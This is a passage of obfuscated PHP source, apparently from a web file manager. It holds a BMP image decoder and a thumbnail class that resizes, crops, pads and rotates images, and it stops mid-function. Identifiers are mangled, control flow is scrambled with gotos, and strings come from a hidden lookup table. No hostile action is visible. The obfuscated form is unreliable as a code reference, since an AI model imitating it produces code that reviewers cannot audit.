<?php
 goto a½ÌĞíÓ®; CÏˆ³„÷Šº: function beforeShutdown() { Hook::trigger($_SERVER[üá][36]); } $_SERVER[$_SERVER[üá][37]] = BASIC_PATH; $_SERVER[$_SERVER[üá][38]] = LIB_DIR; goto eï§ŞÔÉßİ; f¯‡ïã—ÉÕ: class ImageGdBMP { public static function load($eåÍÂøÄÅ) { $aÍ­•µëİ· = fopen($eåÍÂøÄÅ, $_SERVER[õëù©û][1484]); if ($aÍ­•µëİ· === !1) { return !1; } $aì°‹´ø§È = self::loadFromStream($aÍ­•µëİ·); fclose($aÍ­•µëİ·); return $aì°‹´ø§È; } public static function loadFromStream($C³êïÃµÔ…) { $a‹ô‘à—­ =& $_SERVER[õëù©û]; $Eğ‹¸Ú°…­ = fread($C³êïÃµÔ…, 14); if ($Eğ‹¸Ú°…­ === !1) { return !1; } if ($Eğ‹¸Ú°…­[0] != $a‹ô‘à—­[1796] || $Eğ‹¸Ú°…­[1] != $a‹ô‘à—­[1797]) { return !1; } $D·–™ˆ© = unpack($a‹ô‘à—­[1798] . $a‹ô‘à—­[1799] . $a‹ô‘à—­[1800] . $a‹ô‘à—­[1801] . $a‹ô‘à—­[1802], $Eğ‹¸Ú°…­); return self::loadFromStreamAndFileHeader($C³êïÃµÔ…, $D·–™ˆ©); } public static function loadFromStreamAndFileHeader($B‰‹ˆóÙØ, array $B¢—¥‹ÅŠà) { goto E¦ËØ†ÊÃ; Dã İê®Å: if ($Cç˜¿ĞÃÊĞ == 1 || $Cç˜¿ĞÃÊĞ == 4 || $Cç˜¿ĞÃÊĞ == 8) { goto BŠ¤Û×‘º; Bá³‘¢¥Ò: $AŒ±¢‘¯ùŞ = array(); for ($e“ôï‚’åµ = 0; $e“ôï‚’åµ < $c”Ÿ¬¤‹; ++$e“ôï‚’åµ) { $fäˆíŠªé = fread($B‰‹ˆóÙØ, $aÉÌ¥ïŠŸ…); if ($fäˆíŠªé === !1) { imagedestroy($EÂÀò³µÒ¦); return !1; } extract(unpack($e¦³Š¸ĞÜ®[1822], $fäˆíŠªé . $e¦³Š¸ĞÜ®[1821])); $AŒ±¢‘¯ùŞ[] = imagecolorallocate($EÂÀò³µÒ¦, $Aï¤Å¦àÛ¥, $C²µ¯¸ÃˆÌ, $F–Ğå³À¶); } $b¶Ç›ğèâ = 8 - $Cç˜¿ĞÃÊĞ; goto D‘„ •¥Ø; D‘„ •¥Ø: $cç•‡ğ¤´… = (1 << $Cç˜¿ĞÃÊĞ) - 1 << $b¶Ç›ğèâ; if ($eòÔœ¡ˆš == 1 || $eòÔœ¡ˆš == 2) { $bàÇ’ŞİÈ‰ = 0; $C­ãß¸ˆé = $Cç˜¿ĞÃÊĞ >> 2 & 1; for (;;) { if ($bàÇ’ŞİÈ‰ < -1 || $bàÇ’ŞİÈ‰ > $Fº÷°¿¥ë¯ || $dÅÊÎ¤öÌ¨ < -1 || $dÅÊÎ¤öÌ¨ > $Aâ¬ÛŸĞ˜) { imagedestroy($EÂÀò³µÒ¦); return !1; } $fäˆíŠªé = fread($B‰‹ˆóÙØ, 1); if ($fäˆíŠªé === !1) { imagedestroy($EÂÀò³µÒ¦); return !1; } switch ($fäˆíŠªé) { case $e¦³Š¸ĞÜ®[1821]: $fäˆíŠªé = fread($B‰‹ˆóÙØ, 1); if ($fäˆíŠªé === !1) { imagedestroy($EÂÀò³µÒ¦); return !1; } switch ($fäˆíŠªé) { case $e¦³Š¸ĞÜ®[1821]: $dÅÊÎ¤öÌ¨ += $C¹³¯…½±Š; $bàÇ’ŞİÈ‰ = 0; break; case $e¦³Š¸ĞÜ®[1823]: $dÅÊÎ¤öÌ¨ = 0; $bàÇ’ŞİÈ‰ = 0; break 3; case $e¦³Š¸ĞÜ®[1824]: $fäˆíŠªé = fread($B‰‹ˆóÙØ, 2); if ($fäˆíŠªé === !1) { imagedestroy($EÂÀò³µÒ¦); return !1; } list(, $EÀëØİ‰ŠÁ, $D…‘¹ªÅÅ‰) = unpack($e¦³Š¸ĞÜ®[1825], $fäˆíŠªé); $bàÇ’ŞİÈ‰ += $EÀëØİ‰ŠÁ; $dÅÊÎ¤öÌ¨ += $D…‘¹ªÅÅ‰ * $C¹³¯…½±Š; break; default: list(, $d®©Ø„¶°Ş) = unpack($e¦³Š¸ĞÜ®[1826], $fäˆíŠªé); $eğêÙßæ©ß = ($d®©Ø„¶°Ş >> $C­ãß¸ˆé) + ($d®©Ø„¶°Ş & $C­ãß¸ˆé); $fäˆíŠªé = fread($B‰‹ˆóÙØ, $eğêÙßæ©ß + 1 & ~1); if ($fäˆíŠªé === !1) { imagedestroy($EÂÀò³µÒ¦); return !1; } for ($e“ôï‚’åµ = 0, $fÄšÆ­çÆ  = 0; $e“ôï‚’åµ < $d®©Ø„¶°Ş; ++$e“ôï‚’åµ, ++$bàÇ’ŞİÈ‰, $fÄšÆ­çÆ  += $Cç˜¿ĞÃÊĞ) { list(, $e÷„ÅÀË†§) = unpack($e¦³Š¸ĞÜ®[1826], $fäˆíŠªé[$fÄšÆ­çÆ  >> 3]); $F–Ğå³À¶ = $fÄšÆ­çÆ  & 7; imagesetpixel($EÂÀò³µÒ¦, $bàÇ’ŞİÈ‰, $dÅÊÎ¤öÌ¨, $AŒ±¢‘¯ùŞ[($e÷„ÅÀË†§ & $cç•‡ğ¤´… >> $F–Ğå³À¶) >> $b¶Ç›ğèâ - $F–Ğå³À¶]); } break; } break; default: $d‘ÆË‘Šˆ = fread($B‰‹ˆóÙØ, 1); if ($d‘ÆË‘Šˆ === !1) { imagedestroy($EÂÀò³µÒ¦); return !1; } list(, $f¾ñ¥Ë†, $e÷„ÅÀË†§) = unpack($e¦³Š¸ĞÜ®[1825], $fäˆíŠªé . $d‘ÆË‘Šˆ); for ($e“ôï‚’åµ = 0, $fÄšÆ­çÆ  = 0; $e“ôï‚’åµ < $f¾ñ¥Ë†; ++$e“ôï‚’åµ, ++$bàÇ’ŞİÈ‰, $fÄšÆ­çÆ  += $Cç˜¿ĞÃÊĞ) { $F–Ğå³À¶ = $fÄšÆ­çÆ  & 7; imagesetpixel($EÂÀò³µÒ¦, $bàÇ’ŞİÈ‰, $dÅÊÎ¤öÌ¨, $AŒ±¢‘¯ùŞ[($e÷„ÅÀË†§ & $cç•‡ğ¤´… >> $F–Ğå³À¶) >> $b¶Ç›ğèâ - $F–Ğå³À¶]); } break; } } } else { for ($fàá˜óÌªù = 0; $fàá˜óÌªù < $e¸„‘‚ã™; ++$fàá˜óÌªù, $dÅÊÎ¤öÌ¨ += $C¹³¯…½±Š) { $fäˆíŠªé = fread($B‰‹ˆóÙØ, $Cåë†”¡õÕ); if ($fäˆíŠªé === !1) { imagedestroy($EÂÀò³µÒ¦); return !1; } $fÄšÆ­çÆ  = 0; for ($bàÇ’ŞİÈ‰ = 0; $bàÇ’ŞİÈ‰ < $Fº÷°¿¥ë¯; ++$bàÇ’ŞİÈ‰, $fÄšÆ­çÆ  += $Cç˜¿ĞÃÊĞ) { list(, $e÷„ÅÀË†§) = unpack($e¦³Š¸ĞÜ®[1826], $fäˆíŠªé[$fÄšÆ­çÆ  >> 3]); $F–Ğå³À¶ = $fÄšÆ­çÆ  & 7; imagesetpixel($EÂÀò³µÒ¦, $bàÇ’ŞİÈ‰, $dÅÊÎ¤öÌ¨, $AŒ±¢‘¯ùŞ[($e÷„ÅÀË†§ & $cç•‡ğ¤´… >> $F–Ğå³À¶) >> $b¶Ç›ğèâ - $F–Ğå³À¶]); } } } goto FÑ²†¤„ê; BŠ¤Û×‘º: $EÂÀò³µÒ¦ = imagecreate($Fº÷°¿¥ë¯, $e¸„‘‚ã™); $aÉÌ¥ïŠŸ… = $f”ÜËŠºÎ˜ == 12 ? 3 : 4; $c”Ÿ¬¤‹ = $AÔ¦çÖõ ? $AÔ¦çÖõ : pow(2, $Cç˜¿ĞÃÊĞ); goto Bá³‘¢¥Ò; FÑ²†¤„ê: } else { goto bËø„…ÜÄ¬; cùÙÇé¬Ã¡: for ($fàá˜óÌªù = 0; $fàá˜óÌªù < $e¸„‘‚ã™; ++$fàá˜óÌªù, $dÅÊÎ¤öÌ¨ += $C¹³¯…½±Š) { $fäˆíŠªé = fread($B‰‹ˆóÙØ, $Cåë†”¡õÕ); if ($fäˆíŠªé === !1) { imagedestroy($EÂÀò³µÒ¦); return !1; } $fÄšÆ­çÆ  = 0; for ($bàÇ’ŞİÈ‰ = 0; $bàÇ’ŞİÈ‰ < $Fº÷°¿¥ë¯; ++$bàÇ’ŞİÈ‰, $fÄšÆ­çÆ  += $Fğßª²„„) { list(, $e÷„ÅÀË†§) = unpack($e¦³Š¸ĞÜ®[1803], substr($fäˆíŠªé, $fÄšÆ­çÆ , $Fğßª²„„) . $e¦³Š¸ĞÜ®[1827]); $f¬î„Ë÷Ÿë = $e÷„ÅÀË†§ & $e·ªÇèƒ‹ä; $FÊ³èÁ÷µ = $e÷„ÅÀË†§ & $CÇ³ƒÑŞ¥±; $eÓÇñˆƒĞ‰ = $e÷„ÅÀË†§ & $a£ÆÓËÍ”; $b¨£¬šƒ†³ = $e÷„ÅÀË†§ & $a«Šñæø±²; $b¨ÜÍ»—± = $aŸ„­è±ß - (($f¬î„Ë÷Ÿë << 7) - $f¬î„Ë÷Ÿë) * $cçî§ÖÄÂÜ; $Aï¤Å¦àÛ¥ = (($FÊ³èÁ÷µ << 8) - $FÊ³èÁ÷µ) * $EğÊ‡‹æİŠ; $C²µ¯¸ÃˆÌ = (($eÓÇñˆƒĞ‰ << 8) - $eÓÇñˆƒĞ‰) * $CÆµ–‰éšÅ; $F–Ğå³À¶ = (($b¨£¬šƒ†³ << 8) - $b¨£¬šƒ†³) * $fïßé£Ú‰¼; imagesetpixel($EÂÀò³µÒ¦, $bàÇ’ŞİÈ‰, $dÅÊÎ¤öÌ¨, $b¨ÜÍ»—± << 24 | $Aï¤Å¦àÛ¥ << 16 | $C²µ¯¸ÃˆÌ << 8 | $F–Ğå³À¶); } } imagealphablending($EÂÀò³µÒ¦, !0); goto E™‡µ¿»îĞ; bËø„…ÜÄ¬: $EÂÀò³µÒ¦ = imagecreatetruecolor($Fº÷°¿¥ë¯, $e¸„‘‚ã™); imagealphablending($EÂÀò³µÒ¦, !1); if ($e·ªÇèƒ‹ä) { imagesavealpha($EÂÀò³µÒ¦, !0); } goto E…Âà™¡; Dò„ºõ¤‡: $EğÊ‡‹æİŠ = $CÇ³ƒÑŞ¥± ? 1 / $CÇ³ƒÑŞ¥± : 1; $CÆµ–‰éšÅ = $a£ÆÓËÍ” ? 1 / $a£ÆÓËÍ” : 1; $fïßé£Ú‰¼ = $a«Šñæø±² ? 1 / $a«Šñæø±² : 1; goto cùÙÇé¬Ã¡; E…Âà™¡: $Fğßª²„„ = $Cç˜¿ĞÃÊĞ >> 3; $aŸ„­è±ß = $e·ªÇèƒ‹ä ? 127 : 0; $cçî§ÖÄÂÜ = $e·ªÇèƒ‹ä ? 1 / $e·ªÇèƒ‹ä : 1; goto Dò„ºõ¤‡; E™‡µ¿»îĞ: } return $EÂÀò³µÒ¦; goto C‚°³‘¸©ø; aÉî¦æ¨£¶: $e¸„‘‚ã™ = abs($Aâ¬ÛŸĞ˜); $dÅÊÎ¤öÌ¨ = $Aâ¬ÛŸĞ˜ > 0 ? $e¸„‘‚ã™ - 1 : 0; $C¹³¯…½±Š = $Aâ¬ÛŸĞ˜ > 0 ? -1 : 1; goto Dã İê®Å; BÜºÅ˜Şõ…: if ($Fº÷°¿¥ë¯ == 0 || $Aâ¬ÛŸĞ˜ == 0 || $FÜ¤ªÓ÷Ä‡ != 1 || ($e·ªÇèƒ‹ä & $CÇ³ƒÑŞ¥±) != 0 || ($e·ªÇèƒ‹ä & $a£ÆÓËÍ”) != 0 || ($e·ªÇèƒ‹ä & $a«Šñæø±²) != 0 || ($CÇ³ƒÑŞ¥± & $a£ÆÓËÍ”) != 0 || ($CÇ³ƒÑŞ¥± & $a«Šñæø±²) != 0 || ($a£ÆÓËÍ” & $a«Šñæø±²) != 0) { return !1; } if ($eòÔœ¡ˆš == 4 || $eòÔœ¡ˆš == 5) { $fäˆíŠªé = stream_get_contents($B‰‹ˆóÙØ, $c¡»¯Œø­‘); if ($fäˆíŠªé === !1) { return !1; } return imagecreatefromstring($fäˆíŠªé); } $Cåë†”¡õÕ = $Fº÷°¿¥ë¯ * $Cç˜¿ĞÃÊĞ + 31 >> 3 & ~3; goto aÉî¦æ¨£¶; E¦ËØ†ÊÃ: $e¦³Š¸ĞÜ® =& $_SERVER[õëù©û]; if ($B¢—¥‹ÅŠà[$e¦³Š¸ĞÜ®[384]] != 19778) { return !1; } $fäˆíŠªé = fread($B‰‹ˆóÙØ, 4); goto Cí¦±æ”õ; Cí¦±æ”õ: if ($fäˆíŠªé === !1) { return !1; } list(, $f”ÜËŠºÎ˜) = unpack($e¦³Š¸ĞÜ®[1803], $fäˆíŠªé); if ($f”ÜËŠºÎ˜ == 12) { goto e¡¨Ÿºİ‰; cÂÙ¸äõ„Ò: $a«Šñæø±² = 255; goto dï‹Ş¼Õ‰; B‰ÏçÊÈŠè: $AÔ¦çÖõ = $d—äë—Š™Ë = $e·ªÇèƒ‹ä = $eòÔœ¡ˆš = 0; $CÇ³ƒÑŞ¥± = 16711680; $a£ÆÓËÍ” = 65280; goto cÂÙ¸äõ„Ò; e¡¨Ÿºİ‰: $fäˆíŠªé = fread($B‰‹ˆóÙØ, $f”ÜËŠºÎ˜ - 4); if ($fäˆíŠªé === !1) { return !1; } extract(unpack($e¦³Š¸ĞÜ®[1804] . $e¦³Š¸ĞÜ®[1805] . $e¦³Š¸ĞÜ®[1806] . $e¦³Š¸ĞÜ®[1807], $fäˆíŠªé)); goto B‰ÏçÊÈŠè; dï‹Ş¼Õ‰: } else { if (124 < $f”ÜËŠºÎ˜ || $f”ÜËŠºÎ˜ < 40) { return !1; } else { goto DÉÔ÷˜Òè; Bƒª¸ÍŒá: if (($Cç˜¿ĞÃÊĞ == 16 || $Cç˜¿ĞÃÊĞ == 24 || $Cç˜¿ĞÃÊĞ == 32) && $eòÔœ¡ˆš == 0 && $CÇ³ƒÑŞ¥± == 0 && $a£ÆÓËÍ” == 0 && $a«Šñæø±² == 0) { switch ($Cç˜¿ĞÃÊĞ) { case 16: $CÇ³ƒÑŞ¥± = 31744; $a£ÆÓËÍ” = 992; $a«Šñæø±² = 31; break; case 24: case 32: $CÇ³ƒÑŞ¥± = 16711680; $a£ÆÓËÍ” = 65280; $a«Šñæø±² = 255; break; } } goto c”…ÁƒÕ·; E–áÛ¶ñçÁ: if ($Fº÷°¿¥ë¯ & 2147483648) { $Fº÷°¿¥ë¯ = -(~$Fº÷°¿¥ë¯ & 4294967295) - 1; } if ($Aâ¬ÛŸĞ˜ & 2147483648) { $Aâ¬ÛŸĞ˜ = -(~$Aâ¬ÛŸĞ˜ & 4294967295) - 1; } if ($DÜÚ§­¬å & 2147483648) { $DÜÚ§­¬å = -(~$DÜÚ§­¬å & 4294967295) - 1; } goto bµ×²×ù¶; DÉÔ÷˜Òè: $fäˆíŠªé = fread($B‰‹ˆóÙØ, 36); if ($fäˆíŠªé === !1) { return !1; } extract(unpack($e¦³Š¸ĞÜ®[1808] . $e¦³Š¸ĞÜ®[1809] . $e¦³Š¸ĞÜ®[1806] . $e¦³Š¸ĞÜ®[1810] . $e¦³Š¸ĞÜ®[1811] . $e¦³Š¸ĞÜ®[1812] . $e¦³Š¸ĞÜ®[1813] . $e¦³Š¸ĞÜ®[1814] . $e¦³Š¸ĞÜ®[1815] . $e¦³Š¸ĞÜ®[1816], $fäˆíŠªé)); goto E–áÛ¶ñçÁ; bµ×²×ù¶: if ($C©ØŒØ°çÚ & 2147483648) { $C©ØŒØ°çÚ = -(~$C©ØŒØ°çÚ & 4294967295) - 1; } if ($B¢—¥‹ÅŠà[$e¦³Š¸ĞÜ®[515]] != 0) { $EÊ±¶ºÛ¼ = $Cç˜¿ĞÃÊĞ == 1 || $Cç˜¿ĞÃÊĞ == 4 || $Cç˜¿ĞÃÊĞ == 8 ? ($AÔ¦çÖõ ? $AÔ¦çÖõ : pow(2, $Cç˜¿ĞÃÊĞ)) << 2 : 0; $a‹Ö‘Ô­›Ñ = $c¡»¯Œø­‘ ? $c¡»¯Œø­‘ : ($Fº÷°¿¥ë¯ * $Cç˜¿ĞÃÊĞ + 31 >> 3 & ~3) * abs($Aâ¬ÛŸĞ˜); $E¾ˆ²ô¨Ï• = $B¢—¥‹ÅŠà[$e¦³Š¸ĞÜ®[515]] - $a‹Ö‘Ô­›Ñ - $EÊ±¶ºÛ¼ - 14; if ($f”ÜËŠºÎ˜ < $E¾ˆ²ô¨Ï• && 40 <= $f”ÜËŠºÎ˜ && $f”ÜËŠºÎ˜ <= 124) { $f”ÜËŠºÎ˜ = $E¾ˆ²ô¨Ï•; } } if ($f”ÜËŠºÎ˜ - 40 > 0) { $fäˆíŠªé = fread($B‰‹ˆóÙØ, $f”ÜËŠºÎ˜ - 40); if ($fäˆíŠªé === !1) { return !1; } extract(unpack($e¦³Š¸ĞÜ®[1817] . $e¦³Š¸ĞÜ®[1818] . $e¦³Š¸ĞÜ®[1819] . $e¦³Š¸ĞÜ®[1820], $fäˆíŠªé . str_repeat($e¦³Š¸ĞÜ®[1821], 120))); } else { $e·ªÇèƒ‹ä = $CÇ³ƒÑŞ¥± = $a£ÆÓËÍ” = $a«Šñæø±² = 0; } goto Bƒª¸ÍŒá; c”…ÁƒÕ·: } } goto BÜºÅ˜Şõ…; C‚°³‘¸©ø: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($F³ÓŞÕ×ÕÔ, $D„‘ø˜÷µÎ) { goto b¹¿Šèç“; D¨¯ÊÜ²Ë…: if (!$this->im) { return !1; } $fºÛªçÂ÷Ó = $_SERVER[õëù©û][33]; $this->imgData = GetImageSize($F³ÓŞÕ×ÕÔ, $fºÛªçÂ÷Ó); goto cµ¯…²³ë; cµ¯…²³ë: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto fñ©¾İÊ¿Ô; b¹¿Šèç“: $this->srcFile = $F³ÓŞÕ×ÕÔ; $this->echoType = $D„‘ø˜÷µÎ; $this->im = self::image($F³ÓŞÕ×ÕÔ); goto D¨¯ÊÜ²Ë…; fñ©¾İÊ¿Ô: } public static function image($bÂ¦‹‡äÅ…) { $fÀŒ¨ªÑ•º =& $_SERVER[õëù©û]; $EĞ‚«—Ã© = $fÀŒ¨ªÑ•º[33]; $dƒ¿¥Èâ¤ = GetImageSize($bÂ¦‹‡äÅ…, $EĞ‚«—Ã©); $eÙàîÅ×é­ = !1; switch ($dƒ¿¥Èâ¤[2]) { case IMAGETYPE_GIF: if (!function_exists($fÀŒ¨ªÑ•º[1828])) { break; } $eÙàîÅ×é­ = imagecreatefromgif($bÂ¦‹‡äÅ…); break; case IMAGETYPE_JPEG: if (!function_exists($fÀŒ¨ªÑ•º[1829])) { break; } $eÙàîÅ×é­ = imagecreatefromjpeg($bÂ¦‹‡äÅ…); break; case IMAGETYPE_PNG: if (!function_exists($fÀŒ¨ªÑ•º[1830])) { break; } $eÙàîÅ×é­ = @imagecreatefrompng($bÂ¦‹‡äÅ…); imagesavealpha($eÙàîÅ×é­, !0); break; case IMAGETYPE_XBM: $eÙàîÅ×é­ = imagecreatefromxbm($bÂ¦‹‡äÅ…); break; case IMAGETYPE_WBMP: $eÙàîÅ×é­ = imagecreatefromwbmp($bÂ¦‹‡äÅ…); break; case IMAGETYPE_BMP: $eÙàîÅ×é­ = imagecreatefrombmp($bÂ¦‹‡äÅ…); break; default: break; } return $eÙàîÅ×é­; } public static function imageSize($eâ’®‹í½) { $e¹ĞâíÀ¼Ä =& $_SERVER[õëù©û]; $dØÌÅˆ¶– = GetImageSize($eâ’®‹í½); if (!$dØÌÅˆ¶–) { return !1; } return array($e¹ĞâíÀ¼Ä[1831] => $dØÌÅˆ¶–[0], $e¹ĞâíÀ¼Ä[1832] => $dØÌÅˆ¶–[1]); } function distortion($BĞöËœ¾Ğ—, $e×áğ±ö, $fà°Ç½§ó) { $aÊÁæ¿ÕÙ† = $this->creatImage($this->im, $e×áğ±ö, $fà°Ç½§ó, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($aÊÁæ¿ÕÙ†, $BĞöËœ¾Ğ—); } function prorate($f·ê‚àËçµ, $BÂ°àôì…», $E¸“À¤ÊøŠ) { $Bæöå¼ † = $BÂ°àôì…» / $E¸“À¤ÊøŠ; $eÏÂÜ–ÊÕ = $this->srcW / $this->srcH; if ($Bæöå¼ † <= $eÏÂÜ–ÊÕ) { $eÛ†¢ğ‚¬ = $BÂ°àôì…»; $fŠÏ§œ´‘˜ = $eÛ†¢ğ‚¬ * ($this->srcH / $this->srcW); } else { $fŠÏ§œ´‘˜ = $E¸“À¤ÊøŠ; $eÛ†¢ğ‚¬ = $fŠÏ§œ´‘˜ * ($this->srcW / $this->srcH); } if ($this->srcW > $BÂ°àôì…» || $this->srcH > $E¸“À¤ÊøŠ) { $Cœ¶¶Ë™— = $this->creatImage($this->im, $eÛ†¢ğ‚¬, $fŠÏ§œ´‘˜, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Cœ¶¶Ë™—, $f·ê‚àËçµ); } else { $Cœ¶¶Ë™— = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Cœ¶¶Ë™—, $f·ê‚àËçµ); } } function cut($a¤Ä ½¢ƒ‹, $cÔ¡¤ˆá·Ú, $EÚ£ĞÈ»Ä£) { goto Fµ‘Àç•˜•; Cƒ¾Àµ: $DŸÚÆîÆÛ = $this->creatImage($this->im, $A›‘å÷àçÖ, $E²ëÏÈÛß , 0, 0, 0, 0, $this->srcW, $this->srcH); $A†»Åˆ¡õ = $this->creatImage($DŸÚÆîÆÛ, $cÔ¡¤ˆá·Ú, $EÚ£ĞÈ»Ä£, 0, 0, ($A›‘å÷àçÖ - $cÔ¡¤ˆá·Ú) / 2, ($E²ëÏÈÛß  - $EÚ£ĞÈ»Ä£) / 2, $cÔ¡¤ˆá·Ú, $EÚ£ĞÈ»Ä£); imageDestroy($DŸÚÆîÆÛ); goto C‚¦Ÿ¬ÚÚ; C‚¦Ÿ¬ÚÚ: return $this->echoImage($A†»Åˆ¡õ, $a¤Ä ½¢ƒ‹); goto EÑ¬ÛĞ÷¯Œ; Fµ‘Àç•˜•: $fÏÎ¥Å²Üº = $cÔ¡¤ˆá·Ú / $EÚ£ĞÈ»Ä£; $C©×ø·Ÿ³ç = $this->srcW / $this->srcH; if ($fÏÎ¥Å²Üº <= $C©×ø·Ÿ³ç) { $E²ëÏÈÛß  = $EÚ£ĞÈ»Ä£; $A›‘å÷àçÖ = $E²ëÏÈÛß  * ($this->srcW / $this->srcH); } else { $A›‘å÷àçÖ = $cÔ¡¤ˆá·Ú; $E²ëÏÈÛß  = $A›‘å÷àçÖ * ($this->srcH / $this->srcW); } goto Cƒ¾Àµ; EÑ¬ÛĞ÷¯Œ: } function backFill($BÃ£ÇÙª, $FÎ±µŠíÛ¦, $FÆ’¥¼Û‹, $Bîî–×ê  = false, $Bç¨¦†§Ú = 255, $D¤Í•ÕÌŞ = 255, $EÉ™±©¶¾ = 255) { goto A¨ˆå²Äğã; bŸÏ™¦¥÷ø: return $this->echoImage($BŠ¾ç×†¡, $BÃ£ÇÙª); goto F°Â„øÀ•ù; A¨ˆå²Äğã: $CŒ¼ÃÁ§•â = $FÎ±µŠíÛ¦ / $FÆ’¥¼Û‹; $fšĞ‹µë¼ = $this->srcW / $this->srcH; if ($CŒ¼ÃÁ§•â <= $fšĞ‹µë¼) { $BØÍ˜öÑõ† = $FÎ±µŠíÛ¦; $a‘‹ÈÄØƒ¨ = $BØÍ˜öÑõ† * ($this->srcH / $this->srcW); } else { $a‘‹ÈÄØƒ¨ = $FÆ’¥¼Û‹; $BØÍ˜öÑõ† = $a‘‹ÈÄØƒ¨ * ($this->srcW / $this->srcH); } goto aì„š¡ÊÏ…; dß†Á×¦: if ($Bîî–×ê ) { $FÇÉŞš¾ºğ = imageColorTransparent($BŠ¾ç×†¡, $FÇÉŞš¾ºğ); $AæÖ¶²»Ùº = $FÆ’¥¼Û‹ - $a‘‹ÈÄØƒ¨; } imageFilledRectangle($BŠ¾ç×†¡, 0, 0, $FÎ±µŠíÛ¦, $FÆ’¥¼Û‹, $FÇÉŞš¾ºğ); if ($this->srcW > $FÎ±µŠíÛ¦ || $this->srcH > $FÆ’¥¼Û‹) { $Eêö¤ËÂ–¡ = $this->creatImage($this->im, $BØÍ˜öÑõ†, $a‘‹ÈÄØƒ¨, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($BØÍ˜öÑõ† < $FÎ±µŠíÛ¦) { imageCopy($BŠ¾ç×†¡, $Eêö¤ËÂ–¡, ($FÎ±µŠíÛ¦ - $BØÍ˜öÑõ†) / 2, 0, 0, 0, $BØÍ˜öÑõ†, $a‘‹ÈÄØƒ¨); } else { if ($a‘‹ÈÄØƒ¨ < $FÆ’¥¼Û‹) { imageCopy($BŠ¾ç×†¡, $Eêö¤ËÂ–¡, 0, $AæÖ¶²»Ùº, 0, 0, $BØÍ˜öÑõ†, $a‘‹ÈÄØƒ¨); } else { imageCopy($BŠ¾ç×†¡, $Eêö¤ËÂ–¡, 0, 0, 0, 0, $BØÍ˜öÑõ†, $a‘‹ÈÄØƒ¨); } } } else { imageCopyMerge($BŠ¾ç×†¡, $this->im, ($FÎ±µŠíÛ¦ - $BØÍ˜öÑõ†) / 2, $AæÖ¶²»Ùº, 0, 0, $BØÍ˜öÑõ†, $a‘‹ÈÄØƒ¨, 100); } goto bŸÏ™¦¥÷ø; aì„š¡ÊÏ…: if (function_exists($_SERVER[õëù©û][1833])) { @($BŠ¾ç×†¡ = imageCreateTrueColor($FÎ±µŠíÛ¦, $FÆ’¥¼Û‹)); if (!$BŠ¾ç×†¡) { $BŠ¾ç×†¡ = imageCreate($FÎ±µŠíÛ¦, $FÆ’¥¼Û‹); } } else { $BŠ¾ç×†¡ = imageCreate($FÎ±µŠíÛ¦, $FÆ’¥¼Û‹); } $AæÖ¶²»Ùº = ($FÆ’¥¼Û‹ - $a‘‹ÈÄØƒ¨) / 2; $FÇÉŞš¾ºğ = imagecolorallocate($BŠ¾ç×†¡, $Bç¨¦†§Ú, $D¤Í•ÕÌŞ, $EÉ™±©¶¾); goto dß†Á×¦; F°Â„øÀ•ù: } function creatImage($d—Ğ–ƒ“Í, $aãäöÅí‡Á, $aš•Ñó–¦, $fÌÒÑÚ£·‘, $E¬Â¥¶ƒÔŸ, $A‚Ğ»†øÕâ, $F°ŠÎİÀËÛ, $c°…âœ¤•Š, $FÃ‚Ã÷¡˜’) { if (function_exists($_SERVER[õëù©û][1833])) { @($AÔ‹ç¸í”Ç = ImageCreateTrueColor($aãäöÅí‡Á, $aš•Ñó–¦)); @imagealphablending($AÔ‹ç¸í”Ç, !1); @imagesavealpha($AÔ‹ç¸í”Ç, !0); if ($AÔ‹ç¸í”Ç) { imageCopyResampled($AÔ‹ç¸í”Ç, $d—Ğ–ƒ“Í, $fÌÒÑÚ£·‘, $E¬Â¥¶ƒÔŸ, $A‚Ğ»†øÕâ, $F°ŠÎİÀËÛ, $aãäöÅí‡Á, $aš•Ñó–¦, $c°…âœ¤•Š, $FÃ‚Ã÷¡˜’); } else { $AÔ‹ç¸í”Ç = ImageCreate($aãäöÅí‡Á, $aš•Ñó–¦); imageCopyResized($AÔ‹ç¸í”Ç, $d—Ğ–ƒ“Í, $fÌÒÑÚ£·‘, $E¬Â¥¶ƒÔŸ, $A‚Ğ»†øÕâ, $F°ŠÎİÀËÛ, $aãäöÅí‡Á, $aš•Ñó–¦, $c°…âœ¤•Š, $FÃ‚Ã÷¡˜’); } } else { $AÔ‹ç¸í”Ç = ImageCreate($aãäöÅí‡Á, $aš•Ñó–¦); imageCopyResized($AÔ‹ç¸í”Ç, $d—Ğ–ƒ“Í, $fÌÒÑÚ£·‘, $E¬Â¥¶ƒÔŸ, $A‚Ğ»†øÕâ, $F°ŠÎİÀËÛ, $aãäöÅí‡Á, $aš•Ñó–¦, $c°…âœ¤•Š, $FÃ‚Ã÷¡˜’); } return $AÔ‹ç¸í”Ç; } public function imgRotate($aº…¢÷òµ, $d…„ºßÒÂ) { goto B‚ªˆ°·; f”ñ²Û¯ : switch ($this->imgData[2]) { case IMAGETYPE_GIF: $d—¸Ü¢ÁÕ = imagegif($C¯…³Öùƒ, $aº…¢÷òµ); break; case IMAGETYPE_JPEG: $d—¸Ü¢ÁÕ = imagejpeg($C¯…³Öùƒ, $aº…¢÷òµ, 100); break; case IMAGETYPE_PNG: $d—¸Ü¢ÁÕ = imagePNG($C¯…³Öùƒ, $aº…¢÷òµ); break; default: break; } imageDestroy($C¯…³Öùƒ); imageDestroy($this->im); goto dÊ¡Î İ…³; dÊ¡Î İ…³: return $d—¸Ü¢ÁÕ; goto aëÂ³¦˜½ë; B‚ªˆ°·: if (!$this->im || $d…„ºßÒÂ % 360 === 0 || !function_exists($_SERVER[õëù©û][1834])) { return !1; } $C¯…³Öùƒ = imageRotate($this->im, 360 - $d…„ºßÒÂ, 0); $d—¸Ü¢ÁÕ = !1; goto f”ñ²Û¯ ; aëÂ³¦˜½ë: } function echoImage($añ”íĞ¾¬ç, $b¿²Ô©õÚ–) { goto B„Ú×Ÿ³á„; B„Ú×Ÿ³á„: $BÄ†Ñª¸ˆ¬ =& $_SERVER[õëù©û]; if (!$añ”íĞ¾¬ç) { return !1; } ob_get_clean(); goto f‘Å‚Öòƒ·; 